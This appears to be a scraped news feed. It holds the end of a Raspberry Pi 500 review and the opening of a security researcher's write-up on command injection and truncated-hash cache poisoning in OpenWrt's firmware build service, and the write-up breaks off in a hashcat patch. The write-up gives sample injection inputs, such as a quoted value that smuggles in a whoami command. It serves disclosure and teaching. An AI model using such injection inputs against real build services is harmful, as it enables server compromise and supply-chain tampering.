SSDs. Where we see the biggest difference is in read and write performance and I’m sad to say that micro SD cards are the slowest way to run a Raspberry Pi. I’ve compared the performance of the Raspberry Pi 500 to the recent Raspberry Pi Compute Module 5, which has both eMMC and NVMe storage options.</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-320-80.png.webp 320w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-480-80.png.webp 480w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-650-80.png.webp 650w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-970-80.png.webp 970w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-1024-80.png.webp 1024w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-1200-80.png.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-320-80.png" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-320-80.png 320w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-480-80.png 480w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-650-80.png 650w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-970-80.png 970w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-1024-80.png 1024w, https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc-1200-80.png 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc.png" data-pin-media="https://cdn.mos.cms.futurecdn.net/S7HTG6LbwnhsT6QfXQPiCc.png"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Using dd to read the entire 32GB micro SD to /dev/null, I recorded the Raspberry Pi 500 reaching 89.2 MB/s, not a slouch, but way slower than NVMe at Gen 3 speed (768 MB/s). Sequential write speeds were recorded using Raspberry Pi Diagnostics, part of the OS. I saw 32.25 MB/s with the A2 class micro SD card. For comparison, NVMe Gen 3 reaches 703MB/s.</p><p>So does this mean that Raspberry Pi OS on the Raspberry Pi 500 is an awful experience? Not at all; we just would’ve preferred to have a faster storage option. The branded A2 class cards are excellent, and Raspberry Pi OS was snappy and responsive. To be honest, we could happily use the Raspberry Pi 500 like this. But deep down in our heart we really wanted a little something extra under the hood.</p><h2 id="gpio-access-on-the-raspberry-pi-500-3">GPIO access on the Raspberry Pi 500</h2><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-UsUMufRUcy86LXgPtqnAz4-dN5okiacZjk5O5xX79toHq8luQIlIy84"><figure data-bordeaux-image-check="false"><div><picture data-hydrate="true"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Raspberry Pi 500" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/jenrkivR8VpQWgq5YqFgs5.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div><figcaption><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure></div><p>Just like the Raspberry Pi 400, the Pi 500 needs a breakout board in order to access the GPIO. Luckily, the pinout is the same, so you can reuse an older breakout board. The port comes covered by a rubber stopper,easily removed with some tweezers. Essentially you will have the same GPIO pins as the Raspberry Pi 5, and because of the changes to how Python software is installed (PEP668) and Raspberry Pi’s decision to use the RP1 “Southbridge” for the GPIO, you will have the same experience. All you need to do is use the aforementioned breakout to correctly route the pins for use with a HAT.</p><h2 id="use-cases-for-the-raspberry-pi-500-3">Use Cases for the Raspberry Pi 500</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/SieZ8cFvGa3bPjLPugg976.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>Just like the Raspberry Pi 400, the Pi 500 is there to be a 21st century equivalent to the home computers of the 1980s. You plug in to a wedge-shaped keyboard, hook up to your display, and start work. But the Raspberry Pi 500 has much more processing power than the Pi 400, and that means it can be a viable desktop computer for those that don’t need an RTX 4090 or a power-hungry CPU.</p><h2 id="bottom-line-3">Bottom Line</h2><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-1200-80.jpg.webp 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)"><img src="https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-320-80.jpg" alt="Raspberry Pi 500" srcset="https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86-1200-80.jpg 1200w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-original-mos="https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/3twutphK2e8wSCWMhZfG86.jpg"></picture></p></div><figcaption itemprop="caption description"><span itemprop="copyrightHolder">(Image credit: Tom's Hardware)</span></figcaption></figure><p>I like the Raspberry Pi 500. It's a powerful machine, in a pleasant package. I’m old enough to remember the 1980s home computer craze, and this, just like the Pi 400, reminds me of that time. But now we have much more power. This is a great all-rounder, but like I have been saying throughout this review, it shares many good and bad things with the Pi 400 and the GPIO access and the lack of camera / display ports are the only real negatives. The omission of PCIe based storage is unfortunate, but without an easy access hatch, the plastic would soon break.</p><p>The Raspberry Pi 500 is the kit that you buy as a gift for someone, or as a child’s first computer. I can see this being used in schools and to an extent in offices around the world.</p>
</div>


<div id="slice-container-authorBio-UsUMufRUcy86LXgPtqnAz4"><div><figure data-bordeaux-image-check="false"><div><picture data-hydrate="false"><source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc-140-80.jpg.webp 140w" sizes="99vw" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-nopin="true" data-slice-image="true"><source type="image/jpeg" srcset="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc-140-80.jpg 140w" sizes="99vw" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-nopin="true" data-slice-image="true"><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="Les Pounder" sizes="99vw" loading="lazy" data-normal="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" data-original-mos="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/mZ2MebAz6hhKR6vLUDUbsc.jpg" data-pin-nopin="true" data-slice-image="true"></picture></div></figure></div><p>Les Pounder is an associate editor at Tom's Hardware. He is a creative technologist and for seven years has created projects to educate and inspire minds both young and old. He has worked with the Raspberry Pi Foundation to write and deliver their teacher training program "Picademy".</p></div>





</section>

<div id="slice-container-relatedArticles"><p><h5>Most Popular</h5></p></div>








</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Itch.io Taken Down by Funko (1046 pts)]]></title>
            <link>https://bsky.app/profile/itch.io/post/3lcu6h465bs2n</link>
            <guid>42363727</guid>
            <pubDate>Mon, 09 Dec 2024 07:19:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bsky.app/profile/itch.io/post/3lcu6h465bs2n">https://bsky.app/profile/itch.io/post/3lcu6h465bs2n</a>, See on <a href="https://news.ycombinator.com/item?id=42363727">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Compromising OpenWrt Supply Chain (538 pts)]]></title>
            <link>https://flatt.tech/research/posts/compromising-openwrt-supply-chain-sha256-collision/</link>
            <guid>42363102</guid>
            <pubDate>Mon, 09 Dec 2024 04:36:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://flatt.tech/research/posts/compromising-openwrt-supply-chain-sha256-collision/">https://flatt.tech/research/posts/compromising-openwrt-supply-chain-sha256-collision/</a>, See on <a href="https://news.ycombinator.com/item?id=42363102">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    
    
    <h5>
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <rect x="4" y="5" width="16" height="16" rx="2"></rect>
        <line x1="16" y1="3" x2="16" y2="7"></line>
        <line x1="8" y1="3" x2="8" y2="7"></line>
        <line x1="4" y1="11" x2="20" y2="11"></line>
        <rect x="8" y="15" width="2" height="2"></rect>
      </svg>
      Posted on 
  
    December 6, 2024
  


      
        &nbsp;•&nbsp;
      
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <circle cx="12" cy="12" r="9"></circle>
        <polyline points="12 7 12 12 15 15"></polyline>
      </svg>
      11&nbsp;minutes
      &nbsp;•
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <path d="M3 19a9 9 0 0 1 9 0a9 9 0 0 1 9 0"></path>
        <path d="M3 6a9 9 0 0 1 9 0a9 9 0 0 1 9 0"></path>
        <line x1="3" y1="6" x2="3" y2="19"></line>
        <line x1="12" y1="6" x2="12" y2="19"></line>
        <line x1="21" y1="6" x2="21" y2="19"></line>
      </svg>
      2240&nbsp;words
      
    </h5>
    

    <details id="TableOfContents">
    <summary>
      <span>Table of contents</span>
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <polyline points="6 9 12 15 18 9"></polyline>
     </svg>
    </summary>

    <ul>
        

        
        <li>
        <a href="#introduction">Introduction</a>
        

        
        </li><li>
        <a href="#sysupgradeopenwrtorg">sysupgrade.openwrt.org</a>
        

        
        </li><li>
        <a href="#command-injection">Command injection</a>
        

        
        </li><li>
        <a href="#sha-256-collision">SHA-256 collision</a>
        

        
        </li><li>
        <a href="#brute-forcing-the-sha-256">Brute-forcing the SHA-256</a>
        

        
        </li><li>
        <a href="#combining-both-attacks">Combining both attacks</a>
        

        
        </li><li>
        <a href="#reporting-the-issue">Reporting the issue</a>
        

        
        </li><li>
        <a href="#conclusion">Conclusion</a>
        

        
        </li><li>
        <a href="#shameless-plug">Shameless plug</a>
        </li></ul>
  </details>

    <h2 id="introduction">Introduction</h2>
<p>Hello, I’m RyotaK (<a href="https://twitter.com/ryotkak" target="_blank" rel="noopener">@ryotkak</a>
), a security engineer at Flatt Security Inc.</p>
<p>A few days ago, I was upgrading my home lab network, and I decided to upgrade the <a href="https://openwrt.org/" target="_blank" rel="noopener">OpenWrt</a>
 on my router.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> After accessing the LuCI, which is the web interface of OpenWrt, I noticed that there is a section called <code>Attended Sysupgrade</code>, so I tried to upgrade the firmware using it.</p>
<p>After reading the description, I found that it states it builds new firmware using an online service.</p>
<center>
&nbsp; &nbsp; <img alt="The attended sysupgrade service allows to easily upgrade vanilla and custom firmware images. This is done by building a new firmware on demand via an online service." src="https://flatt.tech/research/compromising-openwrt-supply-chain-sha256-collision/01.png">
</center>
<p>At this point, I was curious about how it works, so I decided to investigate about it.</p>
<h2 id="sysupgradeopenwrtorg">sysupgrade.openwrt.org</h2>
<p>After some research, I found that the online service mentioned above is hosted at <code>sysupgrade.openwrt.org</code>. This service allows users to build a new firmware image by selecting the target device and the desired packages.<br>
When the user tries to upgrade the firmware, OpenWrt on the user side sends a request to the server with the required information including:</p>
<ul>
<li>Target architecture</li>
<li>Device profile</li>
<li>Selected packages</li>
</ul>
<p>The server then builds the firmware image based on the information and sends it back to the OpenWrt, which then flashes the firmware image to the device.</p>
<p>As you can imagine, building an image with user-provided packages can be dangerous. If the server is building the user-provided source code and is not properly isolated, it can be easily compromised.</p>
<p>So, I started to investigate if there were any security issues in the service.</p>
<h2 id="command-injection">Command injection</h2>
<p>Fortunately, the server hosted at <code>sysupgrade.openwrt.org</code> is an open-source project, and the source code is hosted at <a href="https://github.com/openwrt/asu" target="_blank" rel="noopener">openwrt/asu</a>
.<br>
I’ve set up the local instance of the service to investigate further and test the behavior of the service without impacting the production environment.</p>
<p>After reading it a bit, I found that the server is using the containers to isolate the build environment like the following:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L154-L164" target="_blank" rel="noopener">asu/build.py line 154-164</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    container <span>=</span> podman<span>.</span>containers<span>.</span>create(
</span></span><span><span>        image,
</span></span><span><span>        command<span>=</span>[<span>"sleep"</span>, <span>"600"</span>],
</span></span><span><span>        mounts<span>=</span>mounts,
</span></span><span><span>        cap_drop<span>=</span>[<span>"all"</span>],
</span></span><span><span>        no_new_privileges<span>=</span><span>True</span>,
</span></span><span><span>        privileged<span>=</span><span>False</span>,
</span></span><span><span>        networks<span>=</span>{<span>"pasta"</span>: {}},
</span></span><span><span>        auto_remove<span>=</span><span>True</span>,
</span></span><span><span>        environment<span>=</span>environment,
</span></span><span><span>    )
</span></span></code></pre></div><p>I thought that it would be fun to escape the container, so I started to investigate further to find a way to do so.</p>
<p>Shortly after, I spotted the following line in the source code:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L217-L226" target="_blank" rel="noopener">asu/build.py line 217-226</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    returncode, job<span>.</span>meta[<span>"stdout"</span>], job<span>.</span>meta[<span>"stderr"</span>] <span>=</span> run_cmd(
</span></span><span><span>        container,
</span></span><span><span>        [
</span></span><span><span>            <span>"make"</span>,
</span></span><span><span>            <span>"manifest"</span>,
</span></span><span><span>            <span>f</span><span>"PROFILE=</span><span>{</span>build_request<span>.</span>profile<span>}</span><span>"</span>,
</span></span><span><span>            <span>f</span><span>"PACKAGES=</span><span>{</span><span>' '</span><span>.</span>join(build_cmd_packages)<span>}</span><span>"</span>,
</span></span><span><span>            <span>"STRIP_ABI=1"</span>,
</span></span><span><span>        ],
</span></span><span><span>    )
</span></span></code></pre></div><p>The Makefile referenced above is from the imagebuilder of OpenWrt, and the <code>manifest</code> target is defined as follows:</p>
<p><a href="https://github.com/openwrt/openwrt/blob/3ba6737f2f4750e4f7c2b921ff023a99b9a27318/target/imagebuilder/files/Makefile#L325-L335" target="_blank" rel="noopener">target/imagebuilder/files/Makefile line 325-335</a>
</p>
<div><pre tabindex="0"><code data-lang="Makefile"><span><span><span>manifest</span><span>:</span> FORCE
</span></span><span><span>	<span>$(</span>MAKE<span>)</span> -s _check_profile
</span></span><span><span>	<span>$(</span>MAKE<span>)</span> -s _check_keys
</span></span><span><span>	<span>(</span><span>unset</span> PROFILE FILES PACKAGES MAKEFLAGS; <span>\
</span></span></span><span><span><span></span>	<span>$(</span>MAKE<span>)</span> -s _call_manifest <span>\
</span></span></span><span><span><span></span>		<span>$(if</span> <span>$(</span>PROFILE<span>)</span>,USER_PROFILE<span>=</span><span>"</span><span>$(</span>PROFILE_FILTER<span>)</span><span>"</span><span>)</span> <span>\
</span></span></span><span><span><span></span>		<span>$(if</span> <span>$(</span>PACKAGES<span>)</span>,USER_PACKAGES<span>=</span><span>"</span><span>$(</span>PACKAGES<span>)</span><span>"</span><span>)</span><span>)</span>
</span></span></code></pre></div><p>As the <code>make</code> command expands the variable before executing the command, variables that contain the user-controlled value can’t be used securely with it.</p>
<p>For example, the following Makefile with <code>make var="'; whoami #"</code> will execute the <code>whoami</code> command despite the variable <code>var</code> is quoted in the single quotes.</p>
<p>Since the <code>PACKAGES</code> variable contains the <code>packages</code> parameter from the request sent by the user, an attacker can execute an arbitrary command in the imagebuilder container by sending a package like <code>`command to execute`</code>.</p>
<p><a href="https://github.com/openwrt/asu/blob/07a2199dd5256075a5fab539421d55cb4673490c/asu/build_request.py#L59-L70" target="_blank" rel="noopener">asu/build_request.py line 59-70</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    packages: Annotated[
</span></span><span><span>        <span>list</span>[<span>str</span>],
</span></span><span><span>        Field(
</span></span><span><span>            examples<span>=</span>[[<span>"vim"</span>, <span>"tmux"</span>]],
</span></span><span><span>            description<span>=</span><span>"""
</span></span></span><span><span><span>                List of packages, either *additional* or *absolute* depending
</span></span></span><span><span><span>                of the `diff_packages` parameter.  This is augmented by the
</span></span></span><span><span><span>                `packages_versions` field, which allow you to additionally
</span></span></span><span><span><span>                specify the versions of the packages to be installed.
</span></span></span><span><span><span>            """</span><span>.</span>strip(),
</span></span><span><span>        ),
</span></span><span><span>    ] <span>=</span> []
</span></span></code></pre></div><p>While the container that the command is executed in is isolated from the host, it’s still a good starting point to escape the container.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<h2 id="sha-256-collision">SHA-256 collision</h2>
<p>After finding the command injection above, I was looking for a piece to escape the container.</p>
<p>About an hour later, I came across the following code:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/util.py#L119-L149" target="_blank" rel="noopener">asu/util.py line 119-149</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span><span>def</span> <span>get_request_hash</span>(build_request: BuildRequest) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>"""Return sha256sum of an image request
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Creates a reproducible hash of the request by sorting the arguments
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        req (dict): dict containing request information
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of `req`
</span></span></span><span><span><span>    """</span>
</span></span><span><span>    <span>return</span> get_str_hash(
</span></span><span><span>        <span>""</span><span>.</span>join(
</span></span><span><span>            [
</span></span><span><span>                build_request<span>.</span>distro,
</span></span><span><span>                build_request<span>.</span>version,
</span></span><span><span>                build_request<span>.</span>version_code,
</span></span><span><span>                build_request<span>.</span>target,
</span></span><span><span>                build_request<span>.</span>profile<span>.</span>replace(<span>","</span>, <span>"_"</span>),
</span></span><span><span>                get_packages_hash(build_request<span>.</span>packages),
</span></span><span><span>                get_manifest_hash(build_request<span>.</span>packages_versions),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>diff_packages),
</span></span><span><span>                <span>""</span>,  <span># build_request.filesystem</span>
</span></span><span><span>                get_str_hash(build_request<span>.</span>defaults),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>rootfs_size_mb),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>repository_keys),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>repositories),
</span></span><span><span>            ]
</span></span><span><span>        ),
</span></span><span><span>        REQUEST_HASH_LENGTH,
</span></span><span><span>    )
</span></span></code></pre></div><p>This method is used to generate a hash of the request, and the hash is used as the cache key of the builds. When I saw this, I wondered why it has several inner hashes instead of using the raw string.</p>
<p>I checked the code that calculates the hash for packages:</p>
<p><a href="https://github.com/openwrt/asu/blob/07ef08e9db8ccd13e439b8338150f32b1594447b/asu/util.py#L69-L164" target="_blank" rel="noopener">asu/util.py line 152-164</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span><span>def</span> <span>get_str_hash</span>(string: <span>str</span>, length: <span>int</span> <span>=</span> REQUEST_HASH_LENGTH) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>"""Return sha256sum of str with optional length
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        string (str): input string
</span></span></span><span><span><span>        length (int): hash length
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of string with specified length
</span></span></span><span><span><span>    """</span>
</span></span><span><span>    h <span>=</span> hashlib<span>.</span>sha256(<span>bytes</span>(string <span>or</span> <span>""</span>, <span>"utf-8"</span>))
</span></span><span><span>    <span>return</span> h<span>.</span>hexdigest()[:length]
</span></span><span><span>
</span></span><span><span>[<span>...</span>]
</span></span><span><span>
</span></span><span><span><span>def</span> <span>get_packages_hash</span>(packages: <span>list</span>[<span>str</span>]) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>"""Return sha256sum of package list
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Duplicate packages are automatically removed and the list is sorted to be
</span></span></span><span><span><span>    reproducible
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        packages (list): list of packages
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of `req`
</span></span></span><span><span><span>    """</span>
</span></span><span><span>    <span>return</span> get_str_hash(<span>" "</span><span>.</span>join(<span>sorted</span>(<span>list</span>(<span>set</span>(packages)))), <span>12</span>)
</span></span></code></pre></div><p>I immediately noticed that the length of the hash is truncated to 12, out of 64 characters.<br>
12 characters are equivalent to 48 bits, and the key space is <code>2^48 = 281,474,976,710,656</code>, which seems to be too small to avoid collisions.</p>
<p>While this hash isn’t used as the cache key, the outer hash that includes this hash is used. So, by creating a collision of the packages’ hash, we can produce the same cache key even if the packages are different. This allows an attacker to force the server to return the wrong build artifact for requests that have different packages.</p>
<p>As I was unsure if the collision was actually possible, I decided to test it by brute-forcing the SHA-256 to find a 12-character collision.</p>
<h2 id="brute-forcing-the-sha-256">Brute-forcing the SHA-256</h2>
<p>Since I couldn’t find the hash brute-forcing tools with partial match support, I started to implement it by myself.</p>
<p>After some trial and error, I successfully made an OpenCL program to perform the brute-forcing on the GPU. However, upon testing it, the performance was terrible, it takes 10 seconds to calculate 100 million hashes.<br>
This was mostly equivalent to the hash rate of the CPU, and as I had never written an OpenCL program before, I couldn’t optimize it further.</p>
<p>So, I ended up using the known hash brute-forcing tool program called <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a>
.<br>
With the following little hack, I was able to make the Hashcat print the hashes with only 8 characters matched.</p>
<div><pre tabindex="0"><code data-lang="diff"><span><span><span>diff --git a/OpenCL/m01400_a3-optimized.cl b/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span>index 6b82987bb..12f2bc17a 100644
</span></span></span><span><span><span></span><span>--- a/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span></span><span>+++ b/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span></span><span>@@ -165,7 +165,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>   /**
</span></span><span><span>    * reverse
</span></span><span><span>    */
</span></span><span><span><span>-
</span></span></span><span><span><span></span><span>+/*
</span></span></span><span><span><span></span>   u32 a_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[0];
</span></span><span><span>   u32 b_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[1];
</span></span><span><span>   u32 c_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[2];
</span></span><span><span><span>@@ -179,7 +179,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
